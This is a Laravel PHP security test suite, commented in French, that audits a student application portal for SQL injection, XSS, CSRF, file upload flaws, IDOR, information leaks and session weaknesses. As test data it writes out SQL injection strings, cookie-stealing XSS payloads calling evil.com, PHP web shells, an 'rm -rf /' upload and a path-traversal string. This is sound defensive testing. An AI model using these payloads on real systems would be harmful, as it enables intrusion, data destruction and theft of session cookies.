<?php

namespace Tests\Feature;

use Tests\TestCase;
use App\Models\User;
use App\Models\Application;
use App\Models\Document;
use App\Models\Message;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Foundation\Testing\WithFaker;
use Illuminate\Http\UploadedFile;
use Illuminate\Support\Facades\Storage;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Config;

class SecurityAuditTest extends TestCase
{
    use RefreshDatabase, WithFaker;

    protected function setUp(): void
    {
        parent::setUp();
        Storage::fake('local');
    }

    // ========================================
    // AUDIT D'INJECTION SQL
    // ========================================

    /** @test */
    public function sql_injection_audit()
    {
        // Création d'un utilisateur de test
        $user = User::factory()->create([
            'email' => 'test@example.com',
            'password' => Hash::make('Password123!'),
            'role' => 'student'
        ]);

        // Connexion
        $this->post('/login', [
            'email' => 'test@example.com',
            'password' => 'Password123!'
        ]);

        // Test d'injection SQL dans les paramètres de recherche
        $sqlInjectionPayloads = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "' UNION SELECT * FROM users --",
            "admin'--",
            "1' OR '1' = '1' --",
            "'; INSERT INTO users (email, password) VALUES ('hacker@test.com', 'hacked'); --"
        ];

        foreach ($sqlInjectionPayloads as $payload) {
            // Test sur les paramètres de recherche
            $response = $this->get("/admin/applications?search={$payload}");
            
            // Vérifier que la requête ne génère pas d'erreur SQL
            $this->assertNotEquals(500, $response->getStatusCode(), 
                "SQL Injection possible avec payload: {$payload}");
            
            // Vérifier que la réponse est soit 200, 302, ou 403 (pas d'erreur 500)
            $this->assertContains($response->getStatusCode(), [200, 302, 403, 404], 
                "Réponse inattendue pour SQL injection: {$payload}");
        }
    }

    /** @test */
    public function blind_sql_injection_audit()
    {
        // Test d'injection SQL aveugle
        $blindPayloads = [
            "' AND (SELECT COUNT(*) FROM users) > 0 --",
            "' AND (SELECT LENGTH(email) FROM users LIMIT 1) > 0 --",
            "' AND (SELECT ASCII(SUBSTRING(email,1,1)) FROM users LIMIT 1) > 0 --"
        ];

        foreach ($blindPayloads as $payload) {
            $response = $this->get("/admin/applications?search={$payload}");
            
            // Vérifier qu'il n'y a pas de fuite d'informations
            $this->assertNotEquals(500, $response->getStatusCode(), 
                "Blind SQL Injection possible avec payload: {$payload}");
        }
    }

    // ========================================
    // AUDIT XSS (CROSS-SITE SCRIPTING)
    // ========================================

    /** @test */
    public function xss_audit()
    {
        // Création d'un utilisateur de test
        $user = User::factory()->create([
            'email' => 'xss@test.com',
            'password' => Hash::make('Password123!'),
            'role' => 'student'
        ]);

        // Connexion
        $this->post('/login', [
            'email' => 'xss@test.com',
            'password' => 'Password123!'
        ]);

        // Payloads XSS à tester
        $xssPayloads = [
            '<script>alert("XSS")</script>',
            '<img src="x" onerror="alert(\'XSS\')">',
            'javascript:alert("XSS")',
            '<svg onload="alert(\'XSS\')">',
            '"><script>alert("XSS")</script>',
            '\'><script>alert("XSS")</script>',
            '<iframe src="javascript:alert(\'XSS\')">',
            '<body onload="alert(\'XSS\')">',
            '<input onfocus="alert(\'XSS\')" autofocus>',
            '<details open ontoggle="alert(\'XSS\')">'
        ];

        foreach ($xssPayloads as $payload) {
            // Test sur les champs de saisie
            $response = $this->post('/student/messages/send', [
                'application_id' => 1,
                'content' => $payload
            ]);

            // Vérifier que le payload n'est pas exécuté
            $this->assertNotEquals(500, $response->getStatusCode(), 
                "XSS possible avec payload: {$payload}");
        }
    }

    /** @test */
    public function stored_xss_audit()
    {
        // Test XSS stocké dans la base de données
        $user = User::factory()->create([
            'email' => 'stored@test.com',
            'password' => Hash::make('Password123!'),
            'role' => 'student'
        ]);

        $this->post('/login', [
            'email' => 'stored@test.com',
            'password' => 'Password123!'
        ]);

        $storedXssPayloads = [
            '<script>document.location="http://evil.com?cookie="+document.cookie</script>',
            '<img src="x" onerror="fetch(\'http://evil.com?cookie=\'+document.cookie)">',
            '<svg><script>alert(\'Stored XSS\')</script></svg>'
        ];

        foreach ($storedXssPayloads as $payload) {
            // Tenter de stocker le payload
            $response = $this->post('/student/messages/send', [
                'application_id' => 1,
                'content' => $payload
            ]);

            // Vérifier que le contenu est échappé ou rejeté
            $this->assertNotEquals(500, $response->getStatusCode(), 
                "Stored XSS possible avec payload: {$payload}");
        }
    }

    // ========================================
    // AUDIT CSRF (CROSS-SITE REQUEST FORGERY)
    // ========================================

    /** @test */
    public function csrf_protection_audit()
    {
        // Création d'un utilisateur de test
        $user = User::factory()->create([
            'email' => 'csrf@test.com',
            'password' => Hash::make('Password123!'),
            'role' => 'student'
        ]);

        // Connexion
        $this->post('/login', [
            'email' => 'csrf@test.com',
            'password' => 'Password123!'
        ]);

        // Test sans token CSRF
        $response = $this->post('/student/messages/send', [
            'application_id' => 1,
            'content' => 'Test message'
        ], [
            'X-CSRF-TOKEN' => '' // Token vide
        ]);

        // Vérifier que la requête est rejetée sans token CSRF valide
        $this->assertNotEquals(200, $response->getStatusCode(), 
            "CSRF protection manquante sur /student/messages/send");
    }

    /** @test */
    public function csrf_token_validation_audit()
    {
        $user = User::factory()->create([
            'email' => 'token@test.com',
            'password' => Hash::make('Password123!'),
            'role' => 'student'
        ]);

        $this->post('/login', [
            'email' => 'token@test.com',
            'password' => 'Password123!'
        ]);

        // Test avec token CSRF invalide
        $response = $this->post('/student/messages/send', [
            'application_id' => 1,
            'content' => 'Test message'
        ], [
            'X-CSRF-TOKEN' => 'invalid_token_12345'
        ]);

        // Vérifier que la requête est rejetée avec un token invalide
        $this->assertNotEquals(200, $response->getStatusCode(), 
            "CSRF token validation manquante");
    }

    // ========================================
    // AUDIT D'INJECTION DE FICHIERS
    // ========================================

    /** @test */
    public function file_upload_security_audit()
    {
        $user = User::factory()->create([
            'email' => 'upload@test.com',
            'password' => Hash::make('Password123!'),
            'role' => 'student'
        ]);

        $application = Application::factory()->create([
            'user_id' => $user->id
        ]);

        $this->post('/login', [
            'email' => 'upload@test.com',
            'password' => 'Password123!'
        ]);

        // Test d'upload de fichiers malveillants
        $maliciousFiles = [
            'malicious.php' => '<?php system($_GET["cmd"]); ?>',
            'shell.php.jpg' => '<?php eval($_POST["shell"]); ?>',
            'test.php' => '<?php phpinfo(); ?>',
            'backdoor.php' => '<?php file_get_contents("http://evil.com/backdoor"); ?>',
            'exploit.php' => '<?php exec("rm -rf /"); ?>'
        ];

        foreach ($maliciousFiles as $filename => $content) {
            $file = UploadedFile::fake()->createWithContent($filename, $content);
            
            $response = $this->post('/student/documents/upload', [
                'application_id' => $application->id,
                'document' => $file,
                'document_type' => 'cv'
            ]);

            // Vérifier que les fichiers PHP sont rejetés
            $this->assertNotEquals(200, $response->getStatusCode(), 
                "Upload de fichier malveillant possible: {$filename}");
        }
    }

    /** @test */
    public function file_type_validation_audit()
    {
        $user = User::factory()->create([
            'email' => 'type@test.com',
            'password' => Hash::make('Password123!'),
            'role' => 'student'
        ]);

        $application = Application::factory()->create([
            'user_id' => $user->id
        ]);

        $this->post('/login', [
            'email' => 'type@test.com',
            'password' => 'Password123!'
        ]);

        // Test avec des types de fichiers non autorisés
        $forbiddenTypes = [
            'executable.exe' => 'MZ...',
            'script.bat' => '@echo off',
            'script.sh' => '#!/bin/bash',
            'virus.vbs' => 'WScript.Echo "Virus"',
            'malware.js' => 'alert("Malware")'
        ];

        foreach ($forbiddenTypes as $filename => $content) {
            $file = UploadedFile::fake()->createWithContent($filename, $content);
            
            $response = $this->post('/student/documents/upload', [
                'application_id' => $application->id,
                'document' => $file,
                'document_type' => 'cv'
            ]);

            // Vérifier que les types de fichiers dangereux sont rejetés
            $this->assertNotEquals(200, $response->getStatusCode(), 
                "Type de fichier dangereux accepté: {$filename}");
        }
    }

    // ========================================
    // AUDIT D'ACCÈS NON AUTORISÉ
    // ========================================

    /** @test */
    public function unauthorized_access_audit()
    {
        // Test d'accès sans authentification
        $protectedRoutes = [
            '/student/dashboard',
            '/student/application',
            '/student/documents',
            '/student/messages',
            '/admin/dashboard',
            '/admin/users',
            '/admin/applications'
        ];

        foreach ($protectedRoutes as $route) {
            $response = $this->get($route);
            
            // Vérifier que l'accès est bloqué
            $this->assertNotEquals(200, $response->getStatusCode(), 
                "Accès non autorisé possible sur: {$route}");
        }
    }

    /** @test */
    public function privilege_escalation_audit()
    {
        // Test d'élévation de privilèges
        $student = User::factory()->create([
            'email' => 'student@test.com',
            'password' => Hash::make('Password123!'),
            'role' => 'student'
        ]);

        $this->post('/login', [
            'email' => 'student@test.com',
            'password' => 'Password123!'
        ]);

        // Tentative d'accès aux routes admin
        $adminRoutes = [
            '/admin/dashboard',
            '/admin/users',
            '/admin/applications',
            '/admin/documents'
        ];

        foreach ($adminRoutes as $route) {
            $response = $this->get($route);
            
            // Vérifier que l'accès est refusé
            $this->assertNotEquals(200, $response->getStatusCode(), 
                "Élévation de privilèges possible sur: {$route}");
        }
    }

    // ========================================
    // AUDIT IDOR (INSEURE DIRECT OBJECT REFERENCE)
    // ========================================

    /** @test */
    public function idor_vulnerability_audit()
    {
        // Création de deux utilisateurs
        $user1 = User::factory()->create([
            'email' => 'user1@test.com',
            'password' => Hash::make('Password123!'),
            'role' => 'student'
        ]);

        $user2 = User::factory()->create([
            'email' => 'user2@test.com',
            'password' => Hash::make('Password123!'),
            'role' => 'student'
        ]);

        // Création d'applications pour chaque utilisateur
        $app1 = Application::factory()->create([
            'user_id' => $user1->id,
            'university_name' => 'University 1'
        ]);

        $app2 = Application::factory()->create([
            'user_id' => $user2->id,
            'university_name' => 'University 2'
        ]);

        // Connexion avec user1
        $this->post('/login', [
            'email' => 'user1@test.com',
            'password' => 'Password123!'
        ]);

        // Tentative d'accès à l'application de user2
        $response = $this->get("/student/application/{$app2->id}");
        
        // Vérifier que l'accès est refusé
        $this->assertNotEquals(200, $response->getStatusCode(), 
            "Vulnérabilité IDOR détectée: accès à l'application d'un autre utilisateur");
    }

    /** @test */
    public function idor_document_access_audit()
    {
        $user1 = User::factory()->create([
            'email' => 'doc1@test.com',
            'password' => Hash::make('Password123!'),
            'role' => 'student'
        ]);

        $user2 = User::factory()->create([
            'email' => 'doc2@test.com',
            'password' => Hash::make('Password123!'),
            'role' => 'student'
        ]);

        $app1 = Application::factory()->create(['user_id' => $user1->id]);
        $app2 = Application::factory()->create(['user_id' => $user2->id]);

        // Création de documents
        $doc1 = Document::factory()->create([
            'application_id' => $app1->id,
            'document_type' => 'cv',
            'file_path' => 'cv1.pdf'
        ]);

        $doc2 = Document::factory()->create([
            'application_id' => $app2->id,
            'document_type' => 'cv',
            'file_path' => 'cv2.pdf'
        ]);

        // Connexion avec user1
        $this->post('/login', [
            'email' => 'doc1@test.com',
            'password' => 'Password123!'
        ]);

        // Tentative d'accès au document de user2
        $response = $this->get("/student/documents/{$doc2->id}");
        
        // Vérifier que l'accès est refusé
        $this->assertNotEquals(200, $response->getStatusCode(), 
            "Vulnérabilité IDOR détectée: accès au document d'un autre utilisateur");
    }

    // ========================================
    // AUDIT DE FUITE D'INFORMATIONS
    // ========================================

    /** @test */
    public function information_disclosure_audit()
    {
        // Test de fuite d'informations sensibles
        $sensitiveRoutes = [
            '/.env',
            '/config/database.php',
            '/storage/logs/laravel.log',
            '/composer.json',
            '/package.json',
            '/.git/config',
            '/.htaccess',
            '/robots.txt'
        ];

        foreach ($sensitiveRoutes as $route) {
            $response = $this->get($route);
            
            // Vérifier que les fichiers sensibles ne sont pas accessibles
            $this->assertNotEquals(200, $response->getStatusCode(), 
                "Fuite d'informations sensibles possible sur: {$route}");
        }
    }

    /** @test */
    public function error_information_disclosure_audit()
    {
        // Test de fuite d'informations dans les erreurs
        $errorPayloads = [
            "' OR 1=1 --",
            "<script>alert('xss')</script>",
            "../../../etc/passwd",
            "'; DROP TABLE users; --"
        ];

        foreach ($errorPayloads as $payload) {
            $response = $this->get("/admin/applications?search={$payload}");
            
            // Vérifier que les erreurs ne révèlent pas d'informations sensibles
            if ($response->getStatusCode() === 500) {
                $content = $response->getContent();
                
                // Vérifier qu'il n'y a pas de fuite d'informations sensibles
                $this->assertStringNotContainsString('SQLSTATE', $content, 
                    "Fuite d'informations SQL avec payload: {$payload}");
                $this->assertStringNotContainsString('database', $content, 
                    "Fuite d'informations de base de données avec payload: {$payload}");
                $this->assertStringNotContainsString('password', $content, 
                    "Fuite d'informations de mot de passe avec payload: {$payload}");
            }
        }
    }

    // ========================================
    // AUDIT DE CONFIGURATION
    // ========================================

    /** @test */
    public function security_headers_audit()
    {
        $response = $this->get('/');
        
        $headers = $response->headers;
        
        // Vérifier la présence des en-têtes de sécurité
        $securityHeaders = [
            'X-Frame-Options',
            'X-Content-Type-Options',
            'X-XSS-Protection',
            'Referrer-Policy',
            'Content-Security-Policy'
        ];

        foreach ($securityHeaders as $header) {
            $this->assertTrue($headers->has($header) || $headers->has(strtolower($header)), 
                "En-tête de sécurité manquant: {$header}");
        }
    }

    /** @test */
    public function session_security_audit()
    {
        // Vérifier la configuration de session
        $this->assertTrue(Config::get('session.secure'), 'Session non sécurisée');
        $this->assertTrue(Config::get('session.http_only'), 'Session non http_only');
        $this->assertTrue(Config::get('session.same_site') === 'lax' || Config::get('session.same_site') === 'strict', 
            'SameSite non configuré correctement');
    }

    /** @test */
    public function password_policy_audit()
    {
        // Test de politique de mot de passe faible
        $weakPasswords = [
            '123456',
            'password',
            'admin',
            'qwerty',
            'abc123',
            'password123'
        ];

        foreach ($weakPasswords as $weakPassword) {
            $response = $this->post('/register', [
                'name' => 'Test User',
                'email' => "weak{$weakPassword}@test.com",
                'password' => $weakPassword,
                'password_confirmation' => $weakPassword
            ]);

            // Vérifier que les mots de passe faibles sont rejetés
            $this->assertNotEquals(302, $response->getStatusCode(), 
                "Mot de passe faible accepté: {$weakPassword}");
        }
    }

    // ========================================
    // AUDIT DE RATE LIMITING
    // ========================================

    /** @test */
    public function rate_limiting_audit()
    {
        // Test de limitation de taux sur la connexion
        for ($i = 0; $i < 10; $i++) {
            $response = $this->post('/login', [
                'email' => 'rate@test.com',
                'password' => 'wrongpassword'
            ]);
        }

        // Vérifier que le rate limiting est actif
        $this->assertNotEquals(200, $response->getStatusCode(), 
            "Rate limiting manquant sur la page de connexion");
    }

    /** @test */
    public function brute_force_protection_audit()
    {
        // Test de protection contre les attaques par force brute
        $commonPasswords = [
            'admin', 'password', '123456', 'qwerty', 'letmein',
            'welcome', 'monkey', 'dragon', 'master', 'football'
        ];

        foreach ($commonPasswords as $password) {
            $response = $this->post('/login', [
                'email' => 'brute@test.com',
                'password' => $password
            ]);

            // Vérifier que les tentatives multiples sont détectées
            if ($response->getStatusCode() === 429) {
                $this->assertTrue(true, 'Protection contre la force brute active');
                break;
            }
        }
    }

    // ========================================
    // AUDIT DE LOGIQUE MÉTIER
    // ========================================

    /** @test */
    public function business_logic_audit()
    {
        $user = User::factory()->create([
            'email' => 'logic@test.com',
            'password' => Hash::make('Password123!'),
            'role' => 'student'
        ]);

        $this->post('/login', [
            'email' => 'logic@test.com',
            'password' => 'Password123!'
        ]);

        // Test de manipulation des paramètres
        $response = $this->post('/student/messages/send', [
            'application_id' => 999999, // ID inexistant
            'content' => 'Test message'
        ]);

        // Vérifier que l'application inexistante est rejetée
        $this->assertNotEquals(200, $response->getStatusCode(), 
            "Validation de logique métier manquante");
    }

    /** @test */
    public function input_validation_audit()
    {
        $user = User::factory()->create([
            'email' => 'validation@test.com',
            'password' => Hash::make('Password123!'),
            'role' => 'student'
        ]);

        $this->post('/login', [
            'email' => 'validation@test.com',
            'password' => 'Password123!'
        ]);

        // Test de validation d'entrée
        $invalidInputs = [
            'email' => 'invalid-email',
            'phone' => 'not-a-phone',
            'date' => 'invalid-date',
            'number' => 'not-a-number'
        ];

        foreach ($invalidInputs as $field => $value) {
            $response = $this->post('/student/profile/update', [
                $field => $value
            ]);

            // Vérifier que les entrées invalides sont rejetées
            $this->assertNotEquals(200, $response->getStatusCode(), 
                "Validation d'entrée manquante pour: {$field}");
        }
    }

    // ========================================
    // AUDIT DE SESSION
    // ========================================

    /** @test */
    public function session_fixation_audit()
    {
        // Test de fixation de session
        $user = User::factory()->create([
            'email' => 'session@test.com',
            'password' => Hash::make('Password123!'),
            'role' => 'student'
        ]);

        // Obtenir une session avant connexion
        $beforeLogin = $this->get('/');
        $sessionBefore = $beforeLogin->getSession();

        // Connexion
        $loginResponse = $this->post('/login', [
            'email' => 'session@test.com',
            'password' => 'Password123!'
        ]);

        // Vérifier que la session a changé après connexion
        $afterLogin = $this->get('/student/dashboard');
        $sessionAfter = $afterLogin->getSession();

        // La session devrait être régénérée après connexion
        $this->assertNotEquals($sessionBefore, $sessionAfter, 
            "Fixation de session possible");
    }

    /** @test */
    public function session_timeout_audit()
    {
        $user = User::factory()->create([
            'email' => 'timeout@test.com',
            'password' => Hash::make('Password123!'),
            'role' => 'student'
        ]);

        $this->post('/login', [
            'email' => 'timeout@test.com',
            'password' => 'Password123!'
        ]);

        // Simuler un délai d'inactivité
        $this->travel(2)->hours();

        // Tentative d'accès à une page protégée
        $response = $this->get('/student/dashboard');
        
        // Vérifier que la session a expiré
        $this->assertNotEquals(200, $response->getStatusCode(), 
            "Timeout de session non configuré");
    }

    // ========================================
    // AUDIT DE CRYPTAGE
    // ========================================

    /** @test */
    public function password_hashing_audit()
    {
        $user = User::factory()->create([
            'email' => 'hash@test.com',
            'password' => 'Password123!',
            'role' => 'student'
        ]);

        // Vérifier que le mot de passe est hashé
        $this->assertNotEquals('Password123!', $user->password, 
            "Mot de passe non hashé en base de données");
        
        // Vérifier que le hash utilise bcrypt
        $this->assertTrue(Hash::check('Password123!', $user->password), 
            "Hash de mot de passe incorrect");
    }

    /** @test */
    public function sensitive_data_encryption_audit()
    {
        // Vérifier que les données sensibles sont chiffrées
        $user = User::factory()->create([
            'email' => 'encrypt@test.com',
            'password' => Hash::make('Password123!'),
            'role' => 'student',
            'phone' => '0123456789'
        ]);

        // Vérifier que les données sensibles ne sont pas en clair
        $this->assertNotEquals('0123456789', $user->phone, 
            "Données sensibles non chiffrées");
    }

    // ========================================
    // AUDIT DE LOGS
    // ========================================

    /** @test */
    public function security_logging_audit()
    {
        $user = User::factory()->create([
            'email' => 'log@test.com',
            'password' => Hash::make('Password123!'),
            'role' => 'student'
        ]);

        // Tentative de connexion échouée
        $this->post('/login', [
            'email' => 'log@test.com',
            'password' => 'wrongpassword'
        ]);

        // Vérifier que les tentatives de connexion échouées sont loggées
        $logFile = storage_path('logs/laravel.log');
        $this->assertFileExists($logFile, "Fichier de log manquant");
    }

    // ========================================
    // AUDIT DE CONFIGURATION ENVIRONNEMENT
    // ========================================

    /** @test */
    public function environment_configuration_audit()
    {
        // Vérifier la configuration de l'environnement
        $this->assertNotEquals('production', app()->environment(), 
            "Application en mode production pendant les tests");
        
        $this->assertFalse(Config::get('app.debug'), 
            "Mode debug activé en production");
        
        $this->assertNotEmpty(Config::get('app.key'), 
            "Clé d'application manquante");
    }

    /** @test */
    public function database_security_audit()
    {
        // Vérifier la sécurité de la base de données
        $this->assertNotEquals('root', Config::get('database.connections.sqlite.database'), 
            "Utilisation du compte root pour la base de données");
        
        $this->assertNotEmpty(Config::get('database.connections.sqlite.database'), 
            "Configuration de base de données manquante");
    }
}
